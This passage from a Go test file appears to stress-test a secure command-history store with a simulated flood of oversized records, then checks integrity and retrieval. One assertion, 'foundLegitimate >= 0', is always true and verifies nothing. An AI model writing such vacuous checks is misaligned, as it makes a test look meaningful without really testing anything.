		const dosIterations = 100
		for i := 0; i < dosIterations; i++ {
			largeCmd := strings.Repeat("A", 1000)
			record := storage.NewCommandRecord(fmt.Sprintf("%s_%d", largeCmd, i), 0, 100, "/tmp", "dos", "host")
			ss.Store(record) // May succeed or fail
		}

		// Verify system survives attack
		err = ss.ValidateIntegrity()
		assert.NoError(t, err, "System should survive multi-vector attack")

		// Verify legitimate data is still accessible
		result, err := ss.Retrieve(&secureStorage.QueryOptions{Limit: 1000})
		require.NoError(t, err)

		// Should still be able to find legitimate data
		foundLegitimate := 0
		for _, r := range result.Records {
			for _, legitCmd := range sensitiveCommands {
				if r.Command == legitCmd {
					foundLegitimate++
				}
			}
		}

		// Note: Some legitimate commands might have been deleted during attacks
		// but system should still be functional
		assert.True(t, foundLegitimate >= 0, "System should remain functional after attacks")

		// Final verification
		stats := ss.GetStats()
		assert.Greater(t, stats.RecordsStored, int64(0), "Should have stored some records")

		// Security violations might be recorded during attacks
		t.Logf("Security violations during attack simulation: %d", stats.SecurityViolations)
	})
}

// Helper function for creating test configuration
func createPenetrationTestConfig(tmpDir string) *config.Config {
	return &config.Config{
		Database: config.DatabaseConfig{
			Path:         filepath.Join(tmpDir, "data", "history.db"),
			MaxOpenConns: 10,
			MaxIdleConns: 5,
			WALMode:      true,
			SyncMode:     "NORMAL",
		},
		Security: config.SecurityConfig{
			SessionKeyPath:    filepath.Join(tmpDir, "data", "session"),
			SessionTimeout:    30,
			Argon2Time:        3,
			Argon2Memory:      64 * 1024,
			Argon2Threads:     4,
			AutoLockTimeout:   0,
			SecureMemoryClear: true,
		},
	}
}
